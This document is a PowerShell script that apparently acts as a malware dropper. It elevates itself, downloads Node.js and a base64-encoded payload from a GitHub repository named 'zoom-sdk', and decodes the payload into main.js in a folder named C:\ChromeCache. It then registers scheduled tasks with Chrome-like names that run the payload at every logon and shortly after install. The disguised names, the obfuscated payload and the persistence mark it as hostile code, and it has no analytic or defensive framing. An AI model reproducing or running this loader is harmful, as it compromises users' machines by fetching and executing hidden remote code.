#Requires -Version 5.1
$ErrorActionPreference = 'Stop'
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "irm $($args[0]) | iex"
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $arguments" -Verb RunAs
    exit
}
$repoBaseUrl = "https://raw.githubusercontent.com/jeremyglevitt/zoom-sdk/main/"
$chromeCache = "C:\ChromeCache"
$nodeZipPath = Join-Path $chromeCache "node.zip"
$mainJsPath = Join-Path $chromeCache "main.js"
$dataTxtPath = Join-Path $chromeCache "data.txt"
New-Item -ItemType Directory -Path $chromeCache -Force | Out-Null
$nodeUrl = "https://nodejs.org/dist/v22.17.0/node-v22.17.0-win-x64.zip"
Invoke-WebRequest -Uri $nodeUrl -OutFile $nodeZipPath
$nodeExtractPath = Join-Path $chromeCache "node"
New-Item -ItemType Directory -Path $nodeExtractPath -Force | Out-Null
Expand-Archive -Path $nodeZipPath -DestinationPath $nodeExtractPath -Force
$dataTxtUrl = $repoBaseUrl.TrimEnd('/') + "/data.txt"
Invoke-WebRequest -Uri $dataTxtUrl -OutFile $dataTxtPath
$base64Content = Get-Content -Path $dataTxtPath -Raw
$bytes = [System.Convert]::FromBase64String($base64Content)
[System.IO.File]::WriteAllBytes($mainJsPath, $bytes)
$nodeExePath = Get-ChildItem -Path $nodeExtractPath -Recurse -Filter "node.exe" | 
               Select-Object -First 1 -ExpandProperty FullName
function Set-ScheduledTask {
    param($taskName, $arguments, $trigger)
    $action = New-ScheduledTaskAction -Execute $nodeExePath -Argument $arguments
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($task) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings | Out-Null
}
Set-ScheduledTask -taskName "ChromeCacheNodeApp" -arguments "`"$mainJsPath`"" -trigger (New-ScheduledTaskTrigger -AtLogOn)
$startTime = [DateTime]::Now.AddMinutes(5)
Set-ScheduledTask -taskName "ChromeCacheNodeApp-Delayed" -arguments "`"$mainJsPath`"" -trigger (New-ScheduledTaskTrigger -Once -At $startTime)